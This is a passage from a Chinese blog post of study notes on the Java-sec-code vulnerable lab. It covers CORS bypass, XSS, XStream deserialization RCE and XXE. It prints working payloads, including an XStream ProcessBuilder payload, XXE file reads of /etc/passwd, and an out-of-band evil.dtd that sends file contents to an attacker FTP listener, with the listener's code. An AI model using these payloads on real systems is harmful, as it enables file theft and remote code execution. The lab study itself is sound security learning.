class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>请求<code>http://localhost/1.html</code>报错如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Failed to load http:&#x2F;&#x2F;test.joychou.org&#x2F;: The &#39;Access-Control-Allow-Origin&#39; header has a value &#39;http:&#x2F;&#x2F;blacktech.com&#39; that is not equal to the supplied origin. Origin &#39;http:&#x2F;&#x2F;localhost&#39; is therefore not allowed access.</span><br></pre></td></tr></table></figure>

<p>改下<code>/etc/hosts</code>，把 localhost 改成 blacktech.com，请求<code>http://blacktech.com/1.html</code>就不会报错了，而且能获取到<br><a target="_blank" rel="noopener" href="http://test.joychou.org/">http://test.joychou.org</a> 的返回内容<code>It works.</code></p>
<p>我们来看看<code>origin</code>，这个值和Referer一样，前端不能设置，如果<code>http://baidu.com</code>对<code>http://test.joychou.org</code>发起一个跨域请求，那么<code>origin</code>的值就为<code>http://baidu.com</code>。</p>
<p>那么问题来了，如果<code>Access-Control-Allow-Origin</code>设置的域名能被绕过，那么用请求header里的<code>origin</code>绕即可。绕过后，就能获取接口的数据，和JSONP一样。</p>
<h2 id="18-XSS"><a href="#18-XSS" class="headerlink" title="18.XSS"></a>18.XSS</h2><p>XSS作者提供了两种利用场景</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;reflect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String reflect(String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;reflect?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153333287.png" alt="image-20211027153333287"></p>
<p>这里还展示一种将XSS语句带入cookie，然后在其他处调出造成XSS的可能性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;stored&#x2F;store&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String store(String xss, HttpServletResponse response) &#123;</span><br><span class="line">    Cookie cookie &#x3D; new Cookie(&quot;xss&quot;, xss);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">    return &quot;Set param into cookie&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@RequestMapping(&quot;&#x2F;stored&#x2F;show&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依次访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;stored&#x2F;store?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;stored&#x2F;show</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153527388.png" alt="image-20211027153527388"></p>
<p>修复代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;safe&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String safe(String xss) &#123;</span><br><span class="line">    return encode(xss);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static String encode(String origin) &#123;</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&lt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&gt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&quot;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#x2F;&quot;, &quot;&#x2F;&quot;);</span><br><span class="line">    return origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将特殊字符进行转译</p>
<h2 id="19-XStreamRCE"><a href="#19-XStreamRCE" class="headerlink" title="19.XStreamRCE"></a>19.XStreamRCE</h2><blockquote>
<p>XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。</p>
<p>Xstream具有以下优点</p>
<ul>
<li>使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。</li>
<li>无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。</li>
<li>性能 - XStream快速和低内存占用，适合于大对象图或系统。</li>
<li>干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。</li>
<li>不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。</li>
<li>完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。</li>
<li>可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。</li>
<li>安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。</li>
<li>错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。</li>
<li>另一种输出格式 - XStream支持其它的输出格式，如JSON。</li>
</ul>
</blockquote>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @PostMapping(&quot;&#x2F;xstream&quot;)</span><br><span class="line">    public String parseXml(HttpServletRequest request) throws Exception &#123;</span><br><span class="line">        String xml &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">        XStream xstream &#x3D; new XStream(new DomDriver());</span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">        return &quot;xstream&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user &#x3D; new User();</span><br><span class="line">        user.setId(0);</span><br><span class="line">        user.setUsername(&quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">        XStream xstream &#x3D; new XStream(new DomDriver());</span><br><span class="line">        String xml &#x3D; xstream.toXML(user); &#x2F;&#x2F; Serialize</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        user &#x3D; (User) xstream.fromXML(xml); &#x2F;&#x2F; Deserialize</span><br><span class="line">        System.out.println(user.getId() + &quot;: &quot; + user.getUsername());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造请求包如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xstream HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;7BBEAB4E7FC8E7B10575631B0CA5413C; XSRF-TOKEN&#x3D;820fd620-2c78-424b-a852-93ca40553975; remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 445</span><br><span class="line"></span><br><span class="line">&lt;sorted-set&gt;  </span><br><span class="line">  &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;dynamic-proxy&gt; &lt;!-- --&gt;</span><br><span class="line">    &lt;interface&gt;java.lang.Comparable&lt;&#x2F;interface&gt;</span><br><span class="line">    &lt;handler class&#x3D;&quot;java.beans.EventHandler&quot;&gt;</span><br><span class="line">      &lt;target class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;command&gt;</span><br><span class="line">          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">          &lt;string&gt;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">        &lt;&#x2F;command&gt;</span><br><span class="line">      &lt;&#x2F;target&gt;</span><br><span class="line">      &lt;action&gt;start&lt;&#x2F;action&gt;</span><br><span class="line">    &lt;&#x2F;handler&gt;</span><br><span class="line">  &lt;&#x2F;dynamic-proxy&gt;</span><br><span class="line">&lt;&#x2F;sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027154504421.png" alt="image-20211027154504421"></p>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/303donatello/p/13998245.html">CVE-2020-26217 | XStream远程代码执行漏洞</a></li>
<li><a target="_blank" rel="noopener" href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/">通过XStream对象反序列化的RCE</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析</a></li>
</ol>
<h2 id="20-XXE"><a href="#20-XXE" class="headerlink" title="20.XXE"></a>20.XXE</h2><p>XXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;DocumentBuilder&#x2F;vuln01&quot;, method &#x3D; RequestMethod.POST)</span><br><span class="line">public String DocumentBuilderVuln01(HttpServletRequest request) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        String body &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line">        DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db &#x3D; dbf.newDocumentBuilder();</span><br><span class="line">        StringReader sr &#x3D; new StringReader(body);</span><br><span class="line">        InputSource is &#x3D; new InputSource(sr);</span><br><span class="line">        Document document &#x3D; db.parse(is);  &#x2F;&#x2F; parse xml</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 遍历xml节点name和value</span><br><span class="line">        StringBuilder buf &#x3D; new StringBuilder();</span><br><span class="line">        NodeList rootNodeList &#x3D; document.getChildNodes();</span><br><span class="line">        for (int i &#x3D; 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode &#x3D; rootNodeList.item(i);</span><br><span class="line">            NodeList child &#x3D; rootNode.getChildNodes();</span><br><span class="line">            for (int j &#x3D; 0; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                Node node &#x3D; child.item(j);</span><br><span class="line">                buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sr.close();</span><br><span class="line">        return buf.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有回显的利用方式</p>
<p>输入对应的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln01 HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN&#x3D;3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID&#x3D;598DC30E191F87CCFD005A39436FD289; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;book id&#x3D;&quot;1&quot;&gt;		</span><br><span class="line">	&lt;name&gt;Good Job&lt;&#x2F;name&gt;		</span><br><span class="line">	&lt;author&gt;ol4three&lt;&#x2F;author&gt;		</span><br><span class="line">	&lt;year&gt;2021&lt;&#x2F;year&gt;		</span><br><span class="line">	&lt;price&gt;100.00&lt;&#x2F;price&gt;	</span><br><span class="line">&lt;&#x2F;book&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163512520.png" alt="image-20211027163512520"></p>
<p>利用file协议读取文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln01 HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN&#x3D;3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID&#x3D;598DC30E191F87CCFD005A39436FD289; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 131</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE joychou [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;111.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163556622.png" alt="image-20211027163556622"></p>
<p>在 XML 元素中，”&lt;” 和 “&amp;” 是非法的。”&lt;” 会产生错误，因为解析器会把该字符解释为新元素的开始。”&amp;” 也会产生错误，因为解析器会把该字符解释为字符实体的开始。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164028767.png" alt="image-20211027164028767"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ cat 111.txt</span><br><span class="line">ol4three</span><br><span class="line">1111</span><br><span class="line">~!@#%^%&#39;&quot;&gt;</span><br><span class="line">2222</span><br><span class="line">&lt;%&amp;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164104470.png" alt="image-20211027164104470"></p>
<h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><blockquote>
<p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p>
<p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p>
</blockquote>
<p>简单一点的来说，将脚本代码定义为CDATA后，CDATA部分中的内容就会被解析器忽略，这个时候就可以读取文件了。</p>
<h3 id="1-有回显"><a href="#1-有回显" class="headerlink" title="1.有回显"></a>1.有回显</h3><p>本地主机：CDATA Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;test.ol4three.com:800&#x2F;evil.dtd&quot;&gt; %dtd;]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure>

<p>本地主机：evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>但我在测试用CDATA，并没有读取<code>&lt;&amp;</code>成功</p>
<h3 id="2-Bind-无回显"><a href="#2-Bind-无回显" class="headerlink" title="2.Bind 无回显"></a>2.Bind 无回显</h3><p>payloads：</p>
<ul>
<li>没有ENTITY关键字，可以用来Bypass WAF</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http:&#x2F;&#x2F;test.joychou.org&#x2F;evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>有ENTITY关键字，可能会被WAF拦截</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;test.joychou.org&#x2F;evil.dtd&quot;&gt;%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>evil.dtd代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;redhat-release&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;ftp:&#x2F;&#x2F;fakeuser:fakepass@test.joychou.org:2121&#x2F;%payload;&#39;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>

<p>或者将<code>%payload;</code>放在ftp的username或者password处。如果ftp不跟用户名或者密码<code>ftp://test.joychou.org:2121/%payload;</code>，利用FTP协议会接收到Java的版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New client connected</span><br><span class="line">&lt; USER anonymous</span><br><span class="line">&lt; PASS Java1.8.0_121@</span><br><span class="line">&lt; TYPE I</span><br><span class="line">&lt; EPSV ALL</span><br><span class="line">&lt; EPSV</span><br><span class="line">&lt; EPRT |1|172.17.29.150|60731|</span><br><span class="line">&lt; RETR test</span><br><span class="line">&lt; xxe</span><br><span class="line">&lt; ftp</span><br></pre></td></tr></table></figure>

<p>FTP Server代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &#39;socket&#39;</span><br><span class="line">server &#x3D; TCPServer.new 2121</span><br><span class="line">loop do</span><br><span class="line">  Thread.start(server.accept) do |client|</span><br><span class="line">    puts &quot;New client connected&quot;</span><br><span class="line">    data &#x3D; &quot;&quot;</span><br><span class="line">    client.puts(&quot;220 xxe-ftp-server&quot;)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req &#x3D; client.gets()</span><br><span class="line">        puts &quot;&lt; &quot;+req</span><br><span class="line">        if req.include? &quot;USER&quot;</span><br><span class="line">            client.puts(&quot;331 password please - version check&quot;)</span><br><span class="line">        else</span><br><span class="line">           #puts &quot;&gt; 230 more data please!&quot;</span><br><span class="line">            client.puts(&quot;230 more data please!&quot;)</span><br><span class="line">        end</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>测试的结果(Centos)：</p>
<table>
<thead>
<tr>
<th>Java版本</th>
<th>是否能读换行</th>
<th>被截断的字符</th>
<th>其他报错的字符(什么都不能读)</th>
<th>被替换成换行的字符</th>
</tr>
</thead>
<tbody><tr>
<td>1.7.0_80</td>
<td>是</td>
<td># ?</td>
<td>% &amp; ‘</td>
<td>/</td>
</tr>
<tr>
<td>1.8.0_121</td>
<td>是</td>
<td># ?</td>
<td>% &amp; ‘</td>
<td>/</td>
</tr>
<tr>
<td>1.8.0_181</td>
<td>否</td>
<td># ?</td>
<td>% &amp; ‘</td>
<td>/</td>
</tr>
</tbody></table>
<p>可能还有其他的字符和其他的Java版本没有测试。不过我猜测，自从Java 1.8的某个版本起，就不能读取换行。至于是那个版本开始，就不具体测试了，大家知道这个特性就好 -)</p>
<p>也可以把FTP换成HTTP协议，更加直观</p>
<h3 id="3-支持的Xinclude的XXE"><a href="#3-支持的Xinclude的XXE" class="headerlink" title="3.支持的Xinclude的XXE"></a>3.支持的Xinclude的XXE</h3><p>POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;root xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;</span><br><span class="line"> &lt;xi:include href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; parse&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>详情可以查看<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/156227">浅析xml之xinclude &amp; xslt</a></p>
<h3 id="各平台支持协议如下："><a href="#各平台支持协议如下：" class="headerlink" title="各平台支持协议如下："></a>各平台支持协议如下：</h3><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
<p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027165310121.png" alt="image-20211027165310121"></p>
<ol>
<li><a target="_blank" rel="noopener" href="https://blog.spoock.com/2018/10/23/java-xxe/">JAVA常见的XXE漏洞写法和防御</a></li>
<li><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/">Java-XXE-总结</a></li>
<li><a target="_blank" rel="noopener" href="https://jlkl.github.io/2020/08/24/Java_03/">Java_XXE_漏洞</a></li>
</ol>
<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a target="_blank" rel="noopener" href="https://github-wiki-see.page/m/JoyChou93/java-sec-code/wiki/">https://github-wiki-see.page/m/JoyChou93/java-sec-code/wiki/</a></p>
<p><a target="_blank" rel="noopener" href="https://shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#CRLF%E6%B3%A8%E5%85%A5">https://shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#CRLF%E6%B3%A8%E5%85%A5</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>Java-sec-code学习记录</p><p><a href="http://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">http://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>ol4three</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2021-08-12</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-07-14</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/Code-audit/">Code_audit, </a><a class="link-muted" rel="tag" href="/tags/WEB%E5%AE%89%E5%85%A8/">WEB安全 </a></div></div><div class="sharethis-inline-share-buttons"></div><script src=" " defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button is-info donate"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20230128152554.png" alt="Alipay"></span></a><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20230128152647.png" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/08/13/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8B/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Frida--Android逆向之动态加载dex Hook(下)</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/03/10/IOT/D-Link-DIR-882%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%AE%9E%E9%AA%8C/"><span class="level-item">D-Link DIR-882固件解密实验</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title 